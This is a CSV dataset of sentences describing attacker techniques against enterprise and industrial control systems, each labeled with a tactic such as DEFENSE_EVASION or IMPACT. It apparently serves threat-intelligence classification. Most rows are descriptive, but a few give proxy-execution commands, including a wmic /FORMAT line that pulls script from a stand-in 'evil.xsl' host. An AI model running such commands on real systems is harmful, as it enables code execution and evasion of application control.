"Similar to [Domain Accounts], compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.",DEFENSE_EVASION,INITIAL_ACCESS,,

"Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry.",DEFENSE_EVASION,DISCOVERY,,
Adversaries may use scripting to automate these checks into one script and then have the program exit if it determines the system to be a virtual environment.,DEFENSE_EVASION,DISCOVERY,,
Checks could include generic system properties such as host/domain name and samples of network traffic.,DEFENSE_EVASION,DISCOVERY,,
"Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size.",DEFENSE_EVASION,DISCOVERY,,
"Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.",DEFENSE_EVASION,DISCOVERY,,
"In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output.",DEFENSE_EVASION,DISCOVERY,,
"Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment.",DEFENSE_EVASION,DISCOVERY,,
Adversaries may also query for specific readings from these devices.,DEFENSE_EVASION,DISCOVERY,,
Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments.,DEFENSE_EVASION,DISCOVERY,,
"This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.",DEFENSE_EVASION,DISCOVERY,,
"Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job]).",DEFENSE_EVASION,DISCOVERY,,
"Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels] to avoid analysis and scrutiny.",DEFENSE_EVASION,DISCOVERY,,
Benign commands or other operations may also be used to delay malware execution.,DEFENSE_EVASION,DISCOVERY,,
"Loops or otherwise needless repetitions of commands, such as [Ping]s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.",DEFENSE_EVASION,DISCOVERY,,
"Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time.",DEFENSE_EVASION,DISCOVERY,,
"For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.",DEFENSE_EVASION,DISCOVERY,,
Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments.,DEFENSE_EVASION,DISCOVERY,,
Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks.,DEFENSE_EVASION,DISCOVERY,,
Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications.,DEFENSE_EVASION,,,
Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes).,DEFENSE_EVASION,,,
Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key.,DEFENSE_EVASION,,,
"Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.",DEFENSE_EVASION,,,
Adversaries can compromise and manipulate devices that perform encryption of network traffic.,DEFENSE_EVASION,,,
"For example, through behaviors such as [Modify System Image], [Reduce Key Space], and [Disable Crypto Hardware], an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic.",DEFENSE_EVASION,,,
"This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts.",DEFENSE_EVASION,,,
"Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.",DEFENSE_EVASION,,,
"Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks.",DEFENSE_EVASION,,,
"Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering.",DEFENSE_EVASION,,,
"When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image], forcing the use of software to perform encryption on general processors.",DEFENSE_EVASION,,,
"This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space]).",DEFENSE_EVASION,,,
Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.,DEFENSE_EVASION,,,
"Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes).",DEFENSE_EVASION,,,
"As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.",DEFENSE_EVASION,,,
Adversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI] introduced to the system through [Modify System Image] to change the configuration of the device.,DEFENSE_EVASION,,,
"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system.",COMMAND_AND_CONTROL,,,
Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise.,COMMAND_AND_CONTROL,,,
"Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise.",COMMAND_AND_CONTROL,,,
"Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",COMMAND_AND_CONTROL,,,
Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).,COMMAND_AND_CONTROL,,,
"Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel.",COMMAND_AND_CONTROL,,,
Compromised systems may leverage popular websites and social media to host command and control (C2) instructions.,COMMAND_AND_CONTROL,,,
Those infected systems can then send the output from those commands back over that Web service channel.,COMMAND_AND_CONTROL,,,
"The return traffic may occur in a variety of ways, depending on the Web service being utilized.",COMMAND_AND_CONTROL,,,
"For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet.",COMMAND_AND_CONTROL,,,
"Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure.",COMMAND_AND_CONTROL,,,
"Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses.",COMMAND_AND_CONTROL,,,
"Once infected, victims will reach out to and be redirected by these resolvers.",COMMAND_AND_CONTROL,,,
Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).,COMMAND_AND_CONTROL,,,
"Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel.",COMMAND_AND_CONTROL,,,
"Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service.",COMMAND_AND_CONTROL,,,
"Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.",COMMAND_AND_CONTROL,,,
WMI is an administration feature that provides a uniform environment to access Windows system components.,EXECUTION,,,
"The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services] such as [Distributed Component Object Model] (DCOM) and [Windows Remote Management] (WinRM).",EXECUTION,,,
"An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement.",EXECUTION,,,
Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files.,DEFENSE_EVASION,,,
"To support complex operations, the XSL standard includes support for embedded scripting in various languages.",DEFENSE_EVASION,,,
Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control.,DEFENSE_EVASION,,,
"Similar to [Trusted Developer Utilities Proxy Execution], the Microsoft common line transformation utility binary (msxsl.exe).",DEFENSE_EVASION,,,
"Command-line examples:



* msxsl.exe customers[.]xml script[.]xsl

* msxsl.exe script[.]xsl script[.]xsl

* msxsl.exe script[.]jpeg script[.]jpeg.",DEFENSE_EVASION,,,
"Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation] to invoke JScript or VBScript within an XSL file.",DEFENSE_EVASION,,,
"Command-line examples:



* Local File: wmic process list /FORMAT:evil[.]xsl

* Remote File: wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”.",DEFENSE_EVASION,,,
Adversaries with privileged network access may seek to modify network traffic in real time using adversary-in-the-middle (AiTM) attacks.,COLLECTION,,,
"An AiTM attack may allow an adversary to perform the following attacks: [Block Reporting Message], [Spoof Reporting Message], [Modify Parameter], [Unauthorized Command Message].",COLLECTION,,,
Adversaries may automate collection of industrial environment information using tools or scripts.,COLLECTION,,,
This automated collection may leverage native control protocols and tools available in the control systems environment.,COLLECTION,,,
"For example, the OPC protocol may be used to enumerate and gather information.",COLLECTION,,,
"Access to a system or interface with these native protocols may allow collection and enumeration of other attached, communicating servers and devices.",COLLECTION,,,
Adversaries may change the operating mode of a controller to gain additional access to engineering functions such as Program Download.,EXECUTION,,,
Programmable controllers typically have several modes of operation that control the state of the user program and control access to the controllers API.,EXECUTION,,,
Operating modes can be physically selected using a key switch on the face of the controller but may also be selected with calls to the controllers API.,EXECUTION,,,
Operating modes and the mechanisms by which they are selected often vary by vendor and product line.,EXECUTION,,,
Some commonly implemented operating modes are described below: * Program - This mode must be enabled before changes can be made to a devices program.,EXECUTION,,,
This allows program uploads and downloads between the device and an engineering workstation.,EXECUTION,,,
"Often the PLCs logic Is halted, and all outputs may be forced off. * Run - Execution of the devices program occurs in this mode.",EXECUTION,,,
"Input and output (values, points, tags, elements, etc.) are monitored and used according to the programs logic. [Program Upload] and [Program Download] are disabled while in this mode. * Remote - Allows for remote changes to a PLCs operation mode. * Stop - The PLC and program is stopped, while in this mode, outputs are forced off. * Reset - Conditions on the PLC are reset to their original states.",EXECUTION,,,
"Warm resets may retain some memory while cold resets will reset all I/O and data registers. * Test / Monitor mode - Similar to run mode, I/O is processed, although this mode allows for monitoring, force set, resets, and more generally tuning or debugging of the system.",EXECUTION,,,
Often monitor mode may be used as a trial for initialization.,EXECUTION,,,
Adversaries may utilize command-line interfaces (CLIs) to interact with systems and execute commands.,EXECUTION,,,
CLIs provide a means of interacting with computer systems and are a common feature across many types of platforms and devices within control systems environments.,EXECUTION,,,
"Adversaries may also use CLIs to install and run new software, including malicious tools that may be installed over the course of an operation.",EXECUTION,,,
"CLIs are typically accessed locally, but can also be exposed via services, such as SSH, Telnet, and RDP.",EXECUTION,,,
"Commands that are executed in the CLI execute with the current permissions level of the process running the terminal emulator, unless the command specifies a change in permissions context.",EXECUTION,,,
Many controllers have CLI interfaces for management purposes.,EXECUTION,,,
"Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend in with normal network activity, to avoid more detailed inspection.",COMMAND_AND_CONTROL,,,
"They may use the protocol associated with the port, or a completely different protocol.",COMMAND_AND_CONTROL,,,
"They may use commonly open ports, such as the examples provided below. 
 
 * TCP:80 (HTTP) 
 * TCP:443 (HTTPS) 
 * TCP/UDP:53 (DNS) 
 * TCP:1024-4999 (OPC on XP/Win2k3) 
 * TCP:49152-65535 (OPC on Vista and later) 
 * TCP:23 (TELNET) 
 * UDP:161 (SNMP) 
 * TCP:502 (MODBUS) 
 * TCP:102 (S7comm/ISO-TSAP) 
 * TCP:20000 (DNP3) 
 * TCP:44818 (Ethernet/IP).",COMMAND_AND_CONTROL,,,
Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications.,COMMAND_AND_CONTROL,,,
"The definition of a proxy can also be expanded to encompass trust relationships between networks in peer-to-peer, mesh, or trusted connections between networks consisting of hosts or systems that regularly communicate with each other.",COMMAND_AND_CONTROL,,,
The network may be within a single organization or across multiple organizations with trust relationships.,COMMAND_AND_CONTROL,,,
"Adversaries could use these types of relationships to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.",COMMAND_AND_CONTROL,,,
"Adversaries may cause damage and destruction of property to infrastructure, equipment, and the surrounding environment when attacking control systems.",IMPACT,,,
"This technique may result in device and operational equipment breakdown, or represent tangential damage from other techniques used in an attack.",IMPACT,,,
"Depending on the severity of physical damage and disruption caused to control processes and systems, this technique may result in [Loss of Safety].",IMPACT,,,
"Operations that result in [Loss of Control] may also cause damage to property, which may be directly or indirectly motivated by an adversary seeking to cause impact in the form of [Loss of Productivity and Revenue].",IMPACT,,,
"In the Maroochy Shire attack, the adversary gained remote computer access to the control system and altered data so that whatever function should have occurred at affected pumping stations did not occur or occurred in a different way.",IMPACT,,,
"This ultimately led to 800,000 liters of raw sewage being spilled out into the community.",IMPACT,,,
"The raw sewage affected local parks, rivers, and even a local hotel.",IMPACT,,,
This resulted in harm to marine life and produced a sickening stench from the community's now blackened rivers.,IMPACT,,,
The German Federal Office for Information Security (BSI) reported a targeted attack on a steel mill under an incidents affecting business section of its 2014 IT Security Report.,IMPACT,,,
These targeted attacks affected industrial operations and resulted in breakdowns of control system components and even entire installations.,IMPACT,,,
"As a result of these breakdowns, massive impact and damage resulted from the uncontrolled shutdown of a blast furnace.",IMPACT,,,
A Polish student used a remote controller device to interface with the Lodz city tram system in Poland.,IMPACT,,,
Adversaries may target and collect data from information repositories.,COLLECTION,,,
"This can include sensitive data such as specifications, schematics, or diagrams of control system layouts, devices, and processes.",COLLECTION,,,
"Examples of information repositories include reference databases or local machines in the process environment, as well as workstations and databases in the corporate network that might contain information about the ICS.",COLLECTION,,,
"Information collected from these systems may provide the adversary with a better understanding of the operational environment, vendors used, processes, or procedures of the ICS.",COLLECTION,,,
"In a campaign between 2011 and 2013 against ONG organizations, Chinese state-sponsored actors searched document repositories for specific information such as, system manuals, remote terminal unit (RTU) sites, personnel lists, documents that included the string SCAD*, user credentials, and remote dial-up access information.",COLLECTION,,,
Adversaries may leverage manufacturer or supplier set default credentials on control system devices.,LATERAL_MOVEMENT,,,
These default credentials may have administrative permissions and may be necessary for initial configuration of the device.,LATERAL_MOVEMENT,,,
"It is general best practice to change the passwords for these accounts as soon as possible, but some manufacturers may have devices that have passwords or usernames that cannot be changed.",LATERAL_MOVEMENT,,,
"Default credentials are normally documented in an instruction manual that is either packaged with the device, published online through official means, or published online through unofficial means.",LATERAL_MOVEMENT,,,
Adversaries may leverage default credentials that have not been properly modified or disabled.,LATERAL_MOVEMENT,,,
Adversaries may cause a denial of control to temporarily prevent operators and engineers from interacting with process controls.,IMPACT,,,
An adversary may attempt to deny process control access to cause a temporary loss of communication with the control device or to prevent operator adjustment of process controls.,IMPACT,,,
"An affected process may still be operating during the period of control loss, but not necessarily in a desired state.",IMPACT,,,
"In the Maroochy Shire attack, the adversary temporarily shut an investigator out of the network preventing them from issuing any controls.",IMPACT,,,
In the 2017 Dallas Siren incident operators were unable to disable the false alarms from the Office of Emergency Management headquarters.,IMPACT,,,
Adversaries may cause a denial of view in attempt to disrupt and prevent operator oversight on the status of an ICS environment.,IMPACT,,,
"This may manifest itself as a temporary communication failure between a device and its control source, where the interface recovers and becomes available once the interference ceases.",IMPACT,,,
An adversary may attempt to deny operator visibility by preventing them from receiving status and reporting messages.,IMPACT,,,
Denying this view may temporarily block and prevent operators from noticing a change in state or anomalous behavior.,IMPACT,,,
"The environment's data and processes may still be operational, but functioning in an unintended or adversarial manner.",IMPACT,,,
"In the Maroochy Shire attack, the adversary temporarily shut an investigator out of the network, preventing them from viewing the state of the system.",IMPACT,,,
Adversaries may gather information about a PLCs or controllers current operating mode.,COLLECTION,,,
"Operating modes dictate what change or maintenance functions can be manipulated and are often controlled by a key switch on the PLC (e.g., run, prog [program], and remote).",COLLECTION,,,
Knowledge of these states may be valuable to an adversary to determine if they are able to reprogram the PLC.,COLLECTION,,,
Operating modes and the mechanisms by which they are selected often vary by vendor and product line.,COLLECTION,,,
Some commonly implemented operating modes are described below: * Program - This mode must be enabled before changes can be made to a devices program.,COLLECTION,,,
This allows program uploads and downloads between the device and an engineering workstation.,COLLECTION,,,
"Often the PLCs logic Is halted, and all outputs may be forced off. * Run - Execution of the devices program occurs in this mode.",COLLECTION,,,

"With this technique, the user's web browser is targeted and exploited simply by visiting the compromised website.",INITIAL_ACCESS,,,
"The adversary may target a specific community, such as trusted third party suppliers or other industry specific groups, which often visit the target website.",INITIAL_ACCESS,,,
"This kind of targeted attack relies on a common interest, and is known as a strategic web compromise or watering hole attack.",INITIAL_ACCESS,,,
The National Cyber Awareness System (NCAS) has issued a Technical Alert (TA) regarding Russian government cyber activity targeting critical infrastructure sectors.,INITIAL_ACCESS,,,
Analysis by DHS and FBI has noted two distinct categories of victims in the Dragonfly campaign on the Western energy sector: staging and intended targets.,INITIAL_ACCESS,,,
"The adversary targeted the less secure networks of staging targets, including trusted third-party suppliers and related peripheral organizations.",INITIAL_ACCESS,,,
"Initial access to the intended targets used watering hole attacks to target process control, ICS, and critical infrastructure related trade publications and informational websites.",INITIAL_ACCESS,,,
Adversaries may attempt to leverage Application Program Interfaces (APIs) used for communication between control software and the hardware.,EXECUTION,,,
Specific functionality is often coded into APIs which can be called by software to engage specific functions on a device or other software.,EXECUTION,,,
Adversaries may leverage weaknesses to exploit internet-facing software for initial access into an industrial network.,INITIAL_ACCESS,,,
"Internet-facing software may be user applications, underlying networking implementations, an assets operating system, weak defenses, etc.",INITIAL_ACCESS,,,
Targets of this technique may be intentionally exposed for the purpose of remote management and visibility.,INITIAL_ACCESS,,,
An adversary may seek to target public-facing applications as they may provide direct access into an ICS environment or the ability to move into the ICS network.,INITIAL_ACCESS,,,
Publicly exposed applications may be found through online tools that scan the internet for open ports and services.,INITIAL_ACCESS,,,
Version numbers for the exposed application may provide adversaries an ability to target specific known vulnerabilities.,INITIAL_ACCESS,,,
Exposed control protocol or remote access ports found in Commonly Used Port may be of interest by adversaries.,INITIAL_ACCESS,,,
"Adversaries may exploit a software vulnerability to take advantage of a programming error in a program, service, or within the operating system software or kernel itself to enable remote service abuse.",INITIAL_ACCESS,LATERAL_MOVEMENT,,
A common goal for post-compromise exploitation of remote services is for initial access into and lateral movement throughout the ICS environment to enable access to targeted systems.,INITIAL_ACCESS,LATERAL_MOVEMENT,,
"ICS asset owners and operators have been affected by ransomware (or disruptive malware masquerading as ransomware) migrating from enterprise IT to ICS environments: WannaCry, NotPetya, and BadRabbit.",INITIAL_ACCESS,LATERAL_MOVEMENT,,
"In each of these cases, self-propagating (wormable) malware initially infected IT networks, but through exploit (particularly the SMBv1-targeting MS17-010 vulnerability) spread to industrial networks, producing significant impacts.",INITIAL_ACCESS,LATERAL_MOVEMENT,,
Adversaries may leverage external remote services as a point of initial access into your network.,INITIAL_ACCESS,,,
These services allow users to connect to internal network resources from external locations.,INITIAL_ACCESS,,,
"Examples are VPNs, Citrix, and other access mechanisms.",INITIAL_ACCESS,,,
Remote service gateways often manage connections and credential authentication for these services.,INITIAL_ACCESS,,,
External remote services allow administration of a control system from outside the system.,INITIAL_ACCESS,,,
"Often, vendors and internal engineering groups have access to external remote services to control system networks via the corporate network.",INITIAL_ACCESS,,,
"In some cases, this access is enabled directly from the internet.",INITIAL_ACCESS,,,
"While remote access enables ease of maintenance when a control system is in a remote area, compromise of remote access solutions is a liability.",INITIAL_ACCESS,,,
The adversary may use these services to gain access to and execute attacks against a control system network.,INITIAL_ACCESS,,,
Access to valid accounts is often a requirement.,INITIAL_ACCESS,,,
"As they look for an entry point into the control system network, adversaries may begin searching for existing point-to-point VPN implementations at trusted third party networks or through remote support employee connections where split tunneling is enabled.",INITIAL_ACCESS,,,
"In the Maroochy Shire attack, the adversary gained remote computer access to the system over radio.",INITIAL_ACCESS,,,
Adversaries may attempt to gain access to a machine via a Graphical User Interface (GUI) to enhance execution capabilities.,EXECUTION,,,
Access to a GUI allows a user to interact with a computer in a more visual manner than a CLI.,EXECUTION,,,
"A GUI allows users to move a cursor and click on interface objects, with a mouse and keyboard as the main input devices, as opposed to just using the keyboard.",EXECUTION,,,
"If physical access is not an option, then access might be possible via protocols such as VNC on Linux-based and Unix-based operating systems, and RDP on Windows operating systems.",EXECUTION,,,
An adversary can use this access to execute programs and applications on the target machine.,EXECUTION,,,
Adversaries may leverage credentials that are hardcoded in software or firmware to gain an unauthorized interactive user session to an asset.,LATERAL_MOVEMENT,PERSISTENCE,,
"Examples credentials that may be hardcoded in an asset include:

* Username/Passwords
* Cryptographic keys/Certificates
* API tokens.",LATERAL_MOVEMENT,PERSISTENCE,,
"Unlike [Default Credentials], these credentials are built into the system in a way that they either cannot be changed by the asset owner, or may be infeasible to change because of the impact it would cause to the control system operation.",LATERAL_MOVEMENT,PERSISTENCE,,
These credentials may be reused across whole product lines or device models and are often not published or known to the owner and operators of the asset.,LATERAL_MOVEMENT,PERSISTENCE,,
Adversaries may utilize these hardcoded credentials to move throughout the control system environment or provide reliable access for their tools to interact with industrial assets.,LATERAL_MOVEMENT,PERSISTENCE,,

Windows processes often leverage these API functions to perform tasks that require reusable system resources.,EXECUTION,PRIVILEGE_ESCALATION,,
Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions.,EXECUTION,PRIVILEGE_ESCALATION,,
One type of hooking seen in ICS involves redirecting calls to these functions via import address table (IAT) hooking.,EXECUTION,PRIVILEGE_ESCALATION,,
"IAT hooking uses modifications to a processs IAT, where pointers to imported API functions are stored.",EXECUTION,PRIVILEGE_ESCALATION,,
Adversaries may seek to capture process values related to the inputs and outputs of a PLC.,COLLECTION,,,
"During the scan cycle, a PLC reads the status of all inputs and stores them in an image table.",COLLECTION,,,
The image table is the PLCs internal storage location where values of inputs/outputs for one scan are stored while it executes the user program.,COLLECTION,,,
"After the PLC has solved the entire logic program, it updates the output image table.",COLLECTION,,,
The contents of this output image table are written to the corresponding output points in I/O Modules.,COLLECTION,,,
The Input and Output Image tables described above make up the I/O Image on a PLC.,COLLECTION,,,
This image is used by the user program instead of directly interacting with physical I/O.,COLLECTION,,,
Adversaries may collect the I/O Image state of a PLC by utilizing a devices [Native API] to access the memory regions directly.,COLLECTION,,,
The collection of the PLCs I/O state could be used to replace values or inform future stages of an attack.,COLLECTION,,,
Adversaries may gain access into industrial environments through systems exposed directly to the internet for remote access rather than through [External Remote Services].,INITIAL_ACCESS,,,
Internet Accessible Devices are exposed to the internet unintentionally or intentionally without adequate protections.,INITIAL_ACCESS,,,
This may allow for adversaries to move directly into the control system network.,INITIAL_ACCESS,,,
"Access onto these devices is accomplished without the use of exploits, these would be represented within the [Exploit Public-Facing Application] technique.",INITIAL_ACCESS,,,
Adversaries may leverage built in functions for remote access which may not be protected or utilize minimal legacy protections that may be targeted.,INITIAL_ACCESS,,,
These services may be discoverable through the use of online scanning tools.,INITIAL_ACCESS,,,
"In the case of the Bowman dam incident, adversaries leveraged access to the dam control network through a cellular modem.",INITIAL_ACCESS,,,

"In the 2021 Colonial Pipeline ransomware incident, pipeline operations were temporally halted on May 7th and were not fully restarted until May 12th.",IMPACT,,,
Adversaries may seek to achieve a sustained loss of control or a runaway condition in which operators cannot issue any commands even if the malicious interference has subsided.,IMPACT,,,
The German Federal Office for Information Security (BSI) reported a targeted attack on a steel mill in its 2014 IT Security Report.,IMPACT,,,
"As a result of these breakdowns, massive impact resulted in damage and unsafe conditions from the uncontrolled shutdown of a blast furnace.",IMPACT,,,
"Adversaries may cause loss of productivity and revenue through disruption and even damage to the availability and integrity of control system operations, devices, and related processes.",IMPACT,,,
"This technique may manifest as a direct effect of an ICS-targeting attack or tangentially, due to an IT-targeting attack against non-segregated environments.",IMPACT,,,
"In cases where these operations or services are brought to a halt, the loss of productivity may eventually present an impact for the end-users or consumers of products and services.",IMPACT,,,
"The disrupted supply-chain may result in supply shortages and increased prices, among other consequences.",IMPACT,,,
"A ransomware attack on an Australian beverage company resulted in the shutdown of some manufacturing sites, including precautionary halts to protect key systems.",IMPACT,,,
"In the 2021 Colonial Pipeline ransomware incident, the pipeline was unable to transport approximately 2.5 million barrels of fuel per day to the East Coast.",IMPACT,,,
Adversaries may compromise protective system functions designed to prevent the effects of faults and abnormal conditions.,IMPACT,,,
"This can result in equipment damage, prolonged process disruptions and hazards to personnel.",IMPACT,,,
Many faults and abnormal conditions in process control happen too quickly for a human operator to react to.,IMPACT,,,
Speed is critical in correcting these conditions to limit serious impacts such as Loss of Control and Property Damage.,IMPACT,,,
Adversaries may target and disable protective system functions as a prerequisite to subsequent attack execution or to allow for future faults and abnormal conditions to go unchecked.,IMPACT,,,
Detection of a Loss of Protection by operators can result in the shutdown of a process due to strict policies regarding protection systems.,IMPACT,,,
This can cause a Loss of Productivity and Revenue and may meet the technical goals of adversaries seeking to cause process disruptions.,IMPACT,,,
Adversaries may compromise safety system functions designed to maintain safe operation of a process when unacceptable or dangerous conditions occur.,IMPACT,,,
Safety systems are often composed of the same elements as control systems but have the sole purpose of ensuring the process fails in a predetermined safe manner.,IMPACT,,,
Many unsafe conditions in process control happen too quickly for a human operator to react to.,IMPACT,,,
Adversaries may target and disable safety system functions as a prerequisite to subsequent attack execution or to allow for future unsafe conditionals to go unchecked.,IMPACT,,,
Detection of a Loss of Safety by operators can result in the shutdown of a process due to strict policies regarding safety systems.,IMPACT,,,
"Adversaries may cause a sustained or permanent loss of view where the ICS equipment will require local, hands-on operator intervention; for instance, a restart or manual operation.",IMPACT,,,
"By causing a sustained reporting or visibility loss, the adversary can effectively hide the present state of operations.",IMPACT,,,
This loss of view can occur without affecting the physical processes themselves.,IMPACT,,,
Adversaries may manipulate physical process control within the industrial environment.,IMPACT,,,
"Methods of manipulating control can include changes to set point values, tags, or other parameters.",IMPACT,,,
"Adversaries may manipulate control systems devices or possibly leverage their own, to communicate with and command physical control processes.",IMPACT,,,
"The duration of manipulation may be temporary or longer sustained, depending on operator detection.",IMPACT,,,
Methods of Manipulation of Control include: * Man-in-the-middle * Spoof command message * Changing setpoints.,IMPACT,,,
Adversaries may attempt to manipulate the information reported back to operators or controllers.,IMPACT,,,
This manipulation may be short term or sustained.,IMPACT,,,
During this time the process itself could be in a much different state than what is reported.,IMPACT,,,
Operators may be fooled into doing something that is harmful to the system in a loss of view situation.,IMPACT,,,
"With a manipulated view into the systems, operators may issue inappropriate control sequences that introduce faults or catastrophic failures into the system.",IMPACT,,,
Business analysis systems can also be provided with inaccurate data leading to bad management decisions.,IMPACT,,,
Adversaries may modify the tasking of a controller to allow for the execution of their own programs.,EXECUTION,,,
This can allow an adversary to manipulate the execution flow and behavior of a controller.,EXECUTION,,,
"According to 61131-3, the association of a Task with a Program Organization Unit (POU) defines a task association.",EXECUTION,,,
An adversary may modify these associations or create new ones to manipulate the execution flow of a controller.,EXECUTION,,,
Modification of controller tasking can be accomplished using a Program Download in addition to other types of program modification such as online edit and program append.,EXECUTION,,,
"Tasks have properties, such as interval, frequency and priority to meet the requirements of program execution.",EXECUTION,,,
"Some controller vendors implement tasks with implicit, pre-defined properties whereas others allow for these properties to be formulated explicitly.",EXECUTION,,,
An adversary may associate their program with tasks that have a higher priority or execute associated programs more frequently.,EXECUTION,,,
"For instance, to ensure cyclic execution of their program on a Siemens controller, an adversary may add their program to the task, Organization Block 1 (OB1).",EXECUTION,,,
"Adversaries may modify or add a program on a controller to affect how it interacts with the physical process, peripheral devices and other hosts on the network.",PERSISTENCE,,,
Modification to controller programs can be accomplished using a Program Download in addition to other types of program modification such as online edit and program append.,PERSISTENCE,,,
Program modification encompasses the addition and modification of instructions and logic contained in Program Organization Units (POU) and similar programming elements found on controllers.,PERSISTENCE,,,
"This can include, for example, adding new functions to a controller, modifying the logic in existing functions and making new calls from one function to another.",PERSISTENCE,,,
Some programs may allow an adversary to interact directly with the native API of the controller to take advantage of obscure features or vulnerabilities.,PERSISTENCE,,,
Adversaries may install malicious or vulnerable firmware onto modular hardware devices.,PERSISTENCE,,,
Control system devices often contain modular hardware devices.,PERSISTENCE,,,
These devices may have their own set of firmware that is separate from the firmware of the main control system equipment.,PERSISTENCE,,,
"This technique is similar to [System Firmware], but is conducted on other system components that may not have the same capabilities or level of integrity checking.",PERSISTENCE,,,
"Although it results in a device re-image, malicious device firmware may provide persistent access to remaining devices.",PERSISTENCE,,,
"An easy point of access for an adversary is the Ethernet card, which may have its own CPU, RAM, and operating system.",PERSISTENCE,,,
The adversary may attack and likely exploit the computer on an Ethernet card.,PERSISTENCE,,,
"Exploitation of the Ethernet card computer may enable the adversary to accomplish additional attacks, such as the following: * Delayed Attack - The adversary may stage an attack in advance and choose when to launch it, such as at a particularly damaging time. * Brick the Ethernet Card - Malicious firmware may be programmed to result in an Ethernet card failure, requiring a factory return. * Random Attack or Failure - The adversary may load malicious firmware onto multiple field devices.",PERSISTENCE,,,
"Execution of an attack and the time it occurs is generated by a pseudo-random number generator. * A Field Device Worm - The adversary may choose to identify all field devices of the same model, with the end goal of performing a device-wide compromise. * Attack Other Cards on the Field Device - Although it is not the most important module in a field device, the Ethernet card is most accessible to the adversary and malware.",PERSISTENCE,,,
"Compromise of the Ethernet card may provide a more direct route to compromising other modules, such as the CPU module.",PERSISTENCE,,,
Adversaries may gather information about the physical process state.,COLLECTION,,,
This information may be used to gain more information about the process itself or used as a trigger for malicious actions.,COLLECTION,,,
"The sources of process state information may vary such as, OPC tags, historian data, specific PLC block information, or network traffic.",COLLECTION,,,
Adversaries may directly interact with the native OS application programming interface (API) to access system functions.,EXECUTION,,,
"Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. as well as carrying out tasks and requests during routine operations.",EXECUTION,,,
Functionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries.,EXECUTION,,,
"For example, functions such as memcpy and direct operations on memory registers can be used to modify user and system memory space.",EXECUTION,,,
Adversaries may perform network connection enumeration to discover information about device communication patterns.,DISCOVERY,,,
"If an adversary can inspect the state of a network connection with tools, such as Netstat to watch network traffic for details about the source, destination, protocol, and content.",DISCOVERY,,,
